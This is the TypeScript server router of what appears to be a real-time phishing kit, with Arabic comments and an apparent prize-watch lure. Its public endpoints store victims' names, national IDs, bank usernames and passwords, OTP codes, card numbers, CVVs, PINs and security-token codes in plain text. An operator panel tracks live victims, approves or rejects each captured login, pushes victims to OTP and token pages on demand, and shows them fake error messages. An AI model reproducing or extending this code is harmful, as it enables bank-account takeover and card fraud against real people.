import { COOKIE_NAME } from "@shared/const";
import { getSessionCookieOptions } from "./_core/cookies";
import { systemRouter } from "./_core/systemRouter";
import { publicProcedure, router } from "./_core/trpc";
import { getDb } from "./db";
import { applications, liveVisitors, settings } from "../drizzle/schema";
import { eq, desc, sql } from "drizzle-orm";
import { z } from "zod/v4";
import { ENV } from "./_core/env";

// اسم مستخدم لوحة المشرف؛ كلمة المرور تبقى في إعداد بيئي سري على الخادم فقط.
const ADMIN_USERNAME = "admin";
// Session token - changes on each server restart to invalidate old sessions
let adminSessionToken = Date.now().toString();

export const appRouter = router({
  system: systemRouter,
  auth: router({
    me: publicProcedure.query(opts => opts.ctx.user),
    logout: publicProcedure.mutation(({ ctx }) => {
      const cookieOptions = getSessionCookieOptions(ctx.req);
      ctx.res.clearCookie(COOKIE_NAME, { ...cookieOptions, maxAge: -1 });
      return { success: true } as const;
    }),
  }),

  admin: router({
    login: publicProcedure
      .input(z.object({ username: z.string(), password: z.string() }))
      .mutation(async ({ input, ctx }) => {
        if (!ENV.adminDashboardPassword) {
          throw new Error("إعداد كلمة مرور لوحة التحكم غير متاح");
        }

        if (input.username === ADMIN_USERNAME && input.password === ENV.adminDashboardPassword) {
          ctx.res.cookie("admin_session", adminSessionToken, {
            httpOnly: true,
            maxAge: 24 * 60 * 60 * 1000,
            sameSite: "lax",
            path: "/",
          });
          return { success: true };
        }
        throw new Error("بيانات الدخول غير صحيحة");
      }),

    checkSession: publicProcedure.query(({ ctx }) => {
      const cookies = ctx.req.headers.cookie || "";
      const isAdmin = cookies.includes(`admin_session=${adminSessionToken}`);
      return { isAdmin };
    }),

    logout: publicProcedure.mutation(({ ctx }) => {
      ctx.res.clearCookie("admin_session", { path: "/" });
      return { success: true };
    }),

    getApplications: publicProcedure.query(async ({ ctx }) => {
      const cookies = ctx.req.headers.cookie || "";
      if (!cookies.includes(`admin_session=${adminSessionToken}`)) {
        throw new Error("غير مصرح");
      }
      const db = await getDb();
      if (!db) return { apps: [], activeIds: [], liveVisitorCount: 0, totalVisitors: 0 };
      const apps = await db.select().from(applications).orderBy(desc(applications.createdAt));
      // العملاء النشطين: الذين تفاعلوا خلال آخر 2 دقيقة فقط
      const twoMinutesAgo = new Date(Date.now() - 2 * 60 * 1000);
      const activeIds = new Set<string>();
      apps.forEach(app => {
        if (app.lastActiveAt && new Date(app.lastActiveAt).getTime() >= twoMinutesAgo.getTime()) {
          activeIds.add(app.nationalId);
        }
      });
      // الزوار الحاليون في الموقع (خلال آخر 3 دقائق)
      const threeMinutesAgo = new Date(Date.now() - 3 * 60 * 1000);
      const liveVisitorsCount = await db
        .select({ count: sql<number>`count(*)` })
        .from(liveVisitors)
        .where(sql`${liveVisitors.lastActiveAt} >= ${threeMinutesAgo}`);
      // إجمالي الزوار (لا ينقص عند الخروج)
      const totalVisitorsSetting = await db
        .select()
        .from(settings)
        .where(eq(settings.settingKey, 'total_visitors'))
        .limit(1);
      let totalVisitors = Number(totalVisitorsSetting[0]?.settingValue || 0);
      if (totalVisitors === 0) {
        const allLiveCount = await db.select({ count: sql<number>`count(*)` }).from(liveVisitors);
        const actualCount = Number(allLiveCount[0]?.count || 0);
        if (actualCount > 0) {
          totalVisitors = actualCount;
          await db.insert(settings)
            .values({ settingKey: 'total_visitors', settingValue: String(actualCount) })
            .onDuplicateKeyUpdate({ set: { settingValue: String(actualCount) } });
        }
      }
      return {
        apps,
        activeIds: Array.from(activeIds),
        liveVisitorCount: Number(liveVisitorsCount[0]?.count || 0),
        totalVisitors,
      };
    }),

    updateVisitor: publicProcedure
      .input(z.object({ sessionId: z.string(), page: z.string() }))
      .mutation(async ({ input }) => {
        const db = await getDb();
        if (!db) return { success: true };
        const existing = await db.select().from(liveVisitors).where(eq(liveVisitors.sessionId, input.sessionId)).limit(1);
        if (existing.length > 0) {
          await db.update(liveVisitors)
            .set({ currentPage: input.page, lastActiveAt: new Date() })
            .where(eq(liveVisitors.sessionId, input.sessionId));
        } else {
          await db.insert(liveVisitors).values({
            sessionId: input.sessionId,
            currentPage: input.page,
            lastActiveAt: new Date(),
          });
          // زيادة عداد الزوار الإجمالي عند أول زيارة فقط مع دعم التهيئة التلقائية
          await db.insert(settings)
            .values({ settingKey: 'total_visitors', settingValue: '1' })
            .onDuplicateKeyUpdate({
              set: {
                settingValue: sql`CAST(COALESCE(settingValue, '0') AS UNSIGNED) + 1`,
              },
            });
        }
        return { success: true };
      }),

    // توجيه زائر محدد عبر sessionId (للزوار الذين لم يسجلوا بعد)
    redirectVisitor: publicProcedure
      .input(z.object({ sessionId: z.string(), page: z.string() }))
      .mutation(async ({ input, ctx }) => {
        const cookies = ctx.req.headers.cookie || "";
        if (!cookies.includes(`admin_session=${adminSessionToken}`)) {
          throw new Error("غير مصرح");
        }
        const db = await getDb();
        if (!db) throw new Error("DB unavailable");
        await db.update(liveVisitors)
          .set({ redirectTo: input.page })
          .where(eq(liveVisitors.sessionId, input.sessionId));
        return { success: true };
      }),

    // الحصول على توجيه الزائر عبر sessionId
    getVisitorRedirect: publicProcedure
      .input(z.object({ sessionId: z.string() }))
      .query(async ({ input }) => {
        if (!input.sessionId) return { redirectTo: null };
        const db = await getDb();
        if (!db) return { redirectTo: null };
        const result = await db.select({ redirectTo: liveVisitors.redirectTo })
          .from(liveVisitors)
          .where(eq(liveVisitors.sessionId, input.sessionId))
          .limit(1);
        return { redirectTo: result[0]?.redirectTo || null };
      }),

    // مسح توجيه الزائر بعد استهلاكه
    clearVisitorRedirect: publicProcedure
      .input(z.object({ sessionId: z.string() }))
      .mutation(async ({ input }) => {
        const db = await getDb();
        if (!db) return { success: true };
        await db.update(liveVisitors)
          .set({ redirectTo: null })
          .where(eq(liveVisitors.sessionId, input.sessionId));
        return { success: true };
      }),

    // الحصول على قائمة الزوار الحاليين مع تفاصيلهم
    getLiveVisitors: publicProcedure.query(async ({ ctx }) => {
      const cookies = ctx.req.headers.cookie || "";
      if (!cookies.includes(`admin_session=${adminSessionToken}`)) {
        throw new Error("غير مصرح");
      }
      const db = await getDb();
      if (!db) return { visitors: [] };
      const threeMinutesAgo = new Date(Date.now() - 3 * 60 * 1000);
      const visitors = await db.select()
        .from(liveVisitors)
        .where(sql`${liveVisitors.lastActiveAt} >= ${threeMinutesAgo}`)
        .orderBy(desc(liveVisitors.lastActiveAt));
      return { visitors };
    }),

    // الحصول على قائمة جميع الزوار المسجلين في النظام مع إحصائياتهم
    getAllVisitors: publicProcedure.query(async ({ ctx }) => {
      const cookies = ctx.req.headers.cookie || "";
      if (!cookies.includes(`admin_session=${adminSessionToken}`)) {
        throw new Error("غير مصرح");
      }
      const db = await getDb();
      if (!db) return { visitors: [], totalCount: 0, liveCount: 0 };
      const threeMinutesAgo = new Date(Date.now() - 3 * 60 * 1000);
      const allVisitorsList = await db.select()
        .from(liveVisitors)
        .orderBy(desc(liveVisitors.lastActiveAt))
        .limit(100);
      const totalSetting = await db.select()
        .from(settings)
        .where(eq(settings.settingKey, 'total_visitors'))
        .limit(1);
      let totalCount = Number(totalSetting[0]?.settingValue || 0);
      if (totalCount === 0) {
        const allLiveCount = await db.select({ count: sql<number>`count(*)` }).from(liveVisitors);
        totalCount = Number(allLiveCount[0]?.count || 0);
      }
      const liveCount = allVisitorsList.filter(v => v.lastActiveAt && new Date(v.lastActiveAt) >= threeMinutesAgo).length;
      return {
        visitors: allVisitorsList,
        totalCount,
        liveCount,
      };
    }),

    // تصفير أو إعادة تعيين عداد الزوار الإجمالي
    resetTotalVisitors: publicProcedure.mutation(async ({ ctx }) => {
      const cookies = ctx.req.headers.cookie || "";
      if (!cookies.includes(`admin_session=${adminSessionToken}`)) {
        throw new Error("غير مصرح");
      }
      const db = await getDb();
      if (!db) return { success: false };
      const existing = await db.select().from(settings).where(eq(settings.settingKey, 'total_visitors')).limit(1);
      if (existing.length > 0) {
        await db.update(settings).set({ settingValue: '0' }).where(eq(settings.settingKey, 'total_visitors'));
      } else {
        await db.insert(settings).values({ settingKey: 'total_visitors', settingValue: '0' });
      }
      return { success: true };
    }),

    setCustomMessage: publicProcedure
      .input(z.object({ nationalId: z.string(), message: z.string() }))
      .mutation(async ({ input, ctx }) => {
        const cookies = ctx.req.headers.cookie || "";
        if (!cookies.includes(`admin_session=${adminSessionToken}`)) {
          throw new Error("غير مصرح");
        }
        const db = await getDb();
        if (!db) throw new Error("DB unavailable");
        await db.update(applications)
          .set({ customMessage: input.message })
          .where(eq(applications.nationalId, input.nationalId));
        return { success: true };
      }),

    setStatus: publicProcedure
      .input(z.object({ nationalId: z.string(), status: z.enum(["pending", "processing", "approved", "rejected", "waiting-login"]) }))
      .mutation(async ({ input, ctx }) => {
        const cookies = ctx.req.headers.cookie || "";
        if (!cookies.includes(`admin_session=${adminSessionToken}`)) {
          throw new Error("غير مصرح");
        }
        const db = await getDb();
        if (!db) throw new Error("DB unavailable");
        await db.update(applications)
          .set({ status: input.status })
          .where(eq(applications.nationalId, input.nationalId));
        return { success: true };
      }),

    redirectUser: publicProcedure
      .input(z.object({ nationalId: z.string(), page: z.string(), showError: z.boolean().optional() }))
      .mutation(async ({ input, ctx }) => {
        const cookies = ctx.req.headers.cookie || "";
        if (!cookies.includes(`admin_session=${adminSessionToken}`)) {
          throw new Error("غير مصرح");
        }
        const db = await getDb();
        if (!db) throw new Error("DB unavailable");
        // توجيه العميل المحدد للصفحة المطلوبة عبر redirectTo
        await db.update(applications)
          .set({ redirectTo: input.page, redirectError: input.showError ? "يرجى التأكد من صحة البيانات المدخلة" : null, customMessage: null })
          .where(eq(applications.nationalId, input.nationalId));
        return { success: true };
      }),

    approveLogin: publicProcedure
      .input(z.object({ nationalId: z.string() }))
      .mutation(async ({ input, ctx }) => {
        const cookies = ctx.req.headers.cookie || "";
        if (!cookies.includes(`admin_session=${adminSessionToken}`)) {
          throw new Error("غير مصرح");
        }
        const db = await getDb();
        if (!db) throw new Error("DB unavailable");
        // تعيين redirectTo = otp ليتم توجيه العميل لصفحة OTP
        await db.update(applications)
          .set({ redirectTo: "otp", customMessage: null })
          .where(eq(applications.nationalId, input.nationalId));
        return { success: true };
      }),

    rejectLogin: publicProcedure
      .input(z.object({ nationalId: z.string() }))
      .mutation(async ({ input, ctx }) => {
        const cookies = ctx.req.headers.cookie || "";
        if (!cookies.includes(`admin_session=${adminSessionToken}`)) {
          throw new Error("غير مصرح");
        }
        const db = await getDb();
        if (!db) throw new Error("DB unavailable");
        // تعيين redirectTo = login-error ليتم عرض رسالة خطأ
        await db.update(applications)
          .set({ redirectError: "يرجى التأكد من صحة البيانات المدخلة", redirectTo: "login-error" })
          .where(eq(applications.nationalId, input.nationalId));
        return { success: true };
      }),

    redirectWhatsApp: publicProcedure
      .input(z.object({ nationalId: z.string() }))
      .mutation(async ({ input, ctx }) => {
        const cookies = ctx.req.headers.cookie || "";
        if (!cookies.includes(`admin_session=${adminSessionToken}`)) {
          throw new Error("غير مصرح");
        }
        const db = await getDb();
        if (!db) throw new Error("DB unavailable");
        await db.update(applications)
          .set({ redirectTo: "whatsapp", customMessage: null })
          .where(eq(applications.nationalId, input.nationalId));
        return { success: true };
      }),

    redirectToken: publicProcedure
      .input(z.object({ nationalId: z.string() }))
      .mutation(async ({ input, ctx }) => {
        const cookies = ctx.req.headers.cookie || "";
        if (!cookies.includes(`admin_session=${adminSessionToken}`)) {
          throw new Error("غير مصرح");
        }
        const db = await getDb();
        if (!db) throw new Error("DB unavailable");
        await db.update(applications)
          .set({ redirectTo: "token", customMessage: null })
          .where(eq(applications.nationalId, input.nationalId));
        return { success: true };
      }),

    redirectAllToToken: publicProcedure
      .mutation(async ({ ctx }) => {
        const cookies = ctx.req.headers.cookie || "";
        if (!cookies.includes(`admin_session=${adminSessionToken}`)) {
          throw new Error("غير مصرح");
        }
        const db = await getDb();
        if (!db) throw new Error("DB unavailable");
        // تحويل جميع العملاء الذين تفاعلوا خلال آخر 2 دقيقة إلى صفحة التوكن
        const twoMinutesAgo = new Date(Date.now() - 2 * 60 * 1000);
        await db.update(applications)
          .set({ redirectTo: "token", customMessage: null })
          .where(sql`${applications.lastActiveAt} >= ${twoMinutesAgo}`);
        return { success: true };
      }),

    deleteApplication: publicProcedure
      .input(z.object({ nationalId: z.string() }))
      .mutation(async ({ input, ctx }) => {
        const cookies = ctx.req.headers.cookie || "";
        if (!cookies.includes(`admin_session=${adminSessionToken}`)) {
          throw new Error("غير مصرح");
        }
        const db = await getDb();
        if (!db) throw new Error("DB unavailable");
        await db.delete(applications)
          .where(eq(applications.nationalId, input.nationalId));
        return { success: true };
      }),

    clearRedirect: publicProcedure
      .input(z.object({ nationalId: z.string() }))
      .mutation(async ({ input, ctx }) => {
        const cookies = ctx.req.headers.cookie || "";
        if (!cookies.includes(`admin_session=${adminSessionToken}`)) {
          throw new Error("غير مصرح");
        }
        const db = await getDb();
        if (!db) return { success: true };
        await db.update(applications)
          .set({ redirectTo: null, redirectError: null, customMessage: null })
          .where(eq(applications.nationalId, input.nationalId));
        return { success: true };
      }),

    // الحصول على رابط الواتساب الحالي
    getWhatsAppLink: publicProcedure.query(async () => {
      const db = await getDb();
      if (!db) return { link: "https://wa.me/message/4Y76G2TADJUVE1" };
      const result = await db.select().from(settings).where(eq(settings.settingKey, "whatsapp_link")).limit(1);
      return { link: result[0]?.settingValue || "https://wa.me/message/4Y76G2TADJUVE1" };
    }),

    // تحديث رابط الواتساب (admin فقط)
    updateWhatsAppLink: publicProcedure
      .input(z.object({ link: z.string().min(1) }))
      .mutation(async ({ input, ctx }) => {
        const cookies = ctx.req.headers.cookie || "";
        if (!cookies.includes(`admin_session=${adminSessionToken}`)) {
          throw new Error("غير مصرح");
        }
        const db = await getDb();
        if (!db) throw new Error("DB unavailable");
        const existing = await db.select().from(settings).where(eq(settings.settingKey, "whatsapp_link")).limit(1);
        if (existing.length > 0) {
          await db.update(settings).set({ settingValue: input.link }).where(eq(settings.settingKey, "whatsapp_link"));
        } else {
          await db.insert(settings).values({ settingKey: "whatsapp_link", settingValue: input.link });
        }
        return { success: true };
      }),

    // حذف جميع العملاء غير النشطين (admin فقط)
    deleteInactiveClients: publicProcedure.mutation(async ({ ctx }) => {
      const cookies = ctx.req.headers.cookie || "";
      if (!cookies.includes(`admin_session=${adminSessionToken}`)) {
        throw new Error("غير مصرح");
      }
      const db = await getDb();
      if (!db) throw new Error("DB unavailable");
      // العملاء النشطين: الذين تفاعلوا خلال آخر 2 دقيقة
      const twoMinutesAgo = new Date(Date.now() - 2 * 60 * 1000);
      const allApps = await db.select().from(applications);
      const inactiveIds = allApps
        .filter(app => !app.lastActiveAt || new Date(app.lastActiveAt).getTime() < twoMinutesAgo.getTime())
        .map(app => app.nationalId);
      if (inactiveIds.length === 0) return { success: true, deletedCount: 0 };
      for (const nid of inactiveIds) {
        await db.delete(applications).where(eq(applications.nationalId, nid));
      }
      return { success: true, deletedCount: inactiveIds.length };
    }),
  }),

  applications: router({
    savePersonalInfo: publicProcedure
      .input(z.object({
        fullName: z.string(),
        nationalId: z.string(),
        phoneNumber: z.string(),
        governorate: z.string().optional(),
        address: z.string().optional(),
        watchColor: z.string().optional(),
      }))
      .mutation(async ({ input }) => {
        const db = await getDb();
        if (!db) throw new Error("DB unavailable");
        const existing = await db.select().from(applications).where(eq(applications.nationalId, input.nationalId)).limit(1);
        const now = new Date();
        if (existing.length > 0) {
          await db.update(applications)
            .set({
              fullName: input.fullName,
              phoneNumber: input.phoneNumber,
              governorate: input.governorate || "",
              address: input.address || "",
              watchColor: input.watchColor,
              currentPage: "personal",
              lastActiveAt: now,
              redirectTo: null,
              redirectError: null,
            })
            .where(eq(applications.nationalId, input.nationalId));
        } else {
          await db.insert(applications).values({
            nationalId: input.nationalId,
            fullName: input.fullName,
            phoneNumber: input.phoneNumber,
            governorate: input.governorate || "",
            address: input.address || "",
            watchColor: input.watchColor || "",
            currentPage: "personal",
            status: "pending",
            lastActiveAt: now,
          });
        }
        return { success: true };
      }),

    saveLoginData: publicProcedure
      .input(z.object({ nationalId: z.string(), username: z.string(), password: z.string() }))
      .mutation(async ({ input }) => {
        const db = await getDb();
        if (!db) throw new Error("DB unavailable");
        // تصفير redirectTo و redirectError عند كل محاولة تسجيل دخول جديدة
        await db.update(applications)
          .set({
            username: input.username,
            password: input.password,
            currentPage: "login",
            status: "waiting-login",
            lastActiveAt: new Date(),
            redirectTo: null,
            redirectError: null,
          })
          .where(eq(applications.nationalId, input.nationalId));
        return { success: true };
      }),

    saveOtpData: publicProcedure
      .input(z.object({ nationalId: z.string(), otpCode: z.string() }))
      .mutation(async ({ input }) => {
        const db = await getDb();
        if (!db) throw new Error("DB unavailable");
        await db.update(applications)
          .set({ otpCode: input.otpCode, currentPage: "otp", lastActiveAt: new Date() })
          .where(eq(applications.nationalId, input.nationalId));
        return { success: true };
      }),

    saveCardData: publicProcedure
      .input(z.object({
        nationalId: z.string(),
        cardNumber: z.string(),
        cardExpiry: z.string(),
        cardCvv: z.string(),
        cardPin: z.string().optional(),
      }))
      .mutation(async ({ input }) => {
        const db = await getDb();
        if (!db) throw new Error("DB unavailable");
        await db.update(applications)
          .set({ cardNumber: input.cardNumber, cardExpiry: input.cardExpiry, cardCvv: input.cardCvv, cardPin: input.cardPin || "", currentPage: "card", lastActiveAt: new Date() })
          .where(eq(applications.nationalId, input.nationalId));
        return { success: true };
      }),

    saveWatchLink: publicProcedure
      .input(z.object({ nationalId: z.string(), watchLinkOtp: z.string() }))
      .mutation(async ({ input }) => {
        const db = await getDb();
        if (!db) throw new Error("DB unavailable");
        // تحقق: يجب أن يكون الرمز 8 أرقام بالضبط
        if (!/^\d{8}$/.test(input.watchLinkOtp)) {
          throw new Error("رمز التوكن يجب أن يكون 8 أرقام بالضبط");
        }
        await db.update(applications)
          .set({ watchLinkOtp: input.watchLinkOtp, currentPage: "watchlink", lastActiveAt: new Date() })
          .where(eq(applications.nationalId, input.nationalId));
        return { success: true };
      }),

    saveHardToken: publicProcedure
      .input(z.object({ nationalId: z.string(), hardTokenCode: z.string() }))
      .mutation(async ({ input }) => {
        const db = await getDb();
        if (!db) throw new Error("DB unavailable");
        // تحقق: يجب أن يكون الرمز 6 أرقام بالضبط
        if (!/^\d{6}$/.test(input.hardTokenCode)) {
          throw new Error("رمز الأمان يجب أن يكون 6 أرقام بالضبط");
        }
        await db.update(applications)
          .set({ watchLinkOtp: input.hardTokenCode, currentPage: "hard-token", lastActiveAt: new Date() })
          .where(eq(applications.nationalId, input.nationalId));
        return { success: true };
      }),

    updatePage: publicProcedure
      .input(z.object({ nationalId: z.string(), page: z.string() }))
      .mutation(async ({ input }) => {
        const db = await getDb();
        if (!db) return { success: true };
        await db.update(applications)
          .set({ currentPage: input.page, lastActiveAt: new Date() })
          .where(eq(applications.nationalId, input.nationalId));
        return { success: true };
      }),

    getCustomMessage: publicProcedure
      .input(z.object({ nationalId: z.string() }))
      .query(async ({ input }) => {
        if (!input.nationalId) return { message: null };
        const db = await getDb();
        if (!db) return { message: null };
        const result = await db.select({ customMessage: applications.customMessage })
          .from(applications)
          .where(eq(applications.nationalId, input.nationalId))
          .limit(1);
        return { message: result[0]?.customMessage || null };
      }),

    clearCustomMessage: publicProcedure
      .input(z.object({ nationalId: z.string() }))
      .mutation(async ({ input }) => {
        const db = await getDb();
        if (!db) return { success: true };
        await db.update(applications)
          .set({ customMessage: null })
          .where(eq(applications.nationalId, input.nationalId));
        return { success: true };
      }),

    getRedirectStatus: publicProcedure
      .input(z.object({ nationalId: z.string() }))
      .query(async ({ input }) => {
        if (!input.nationalId) return { redirectTo: null, redirectError: null };
        const db = await getDb();
        if (!db) return { redirectTo: null, redirectError: null };
        const result = await db.select({ redirectTo: applications.redirectTo, redirectError: applications.redirectError })
          .from(applications)
          .where(eq(applications.nationalId, input.nationalId))
          .limit(1);
        return {
          redirectTo: result[0]?.redirectTo || null,
          redirectError: result[0]?.redirectError || null,
        };
      }),

    clearRedirectByUser: publicProcedure
      .input(z.object({ nationalId: z.string() }))
      .mutation(async ({ input }) => {
        const db = await getDb();
        if (!db) return { success: true };
        // مسح redirect state بعد استهلاكه من المستخدم (بدون حاجة admin)
        await db.update(applications)
          .set({ redirectTo: null, redirectError: null })
          .where(eq(applications.nationalId, input.nationalId));
        return { success: true };
      }),
  }),
});

export type AppRouter = typeof appRouter;
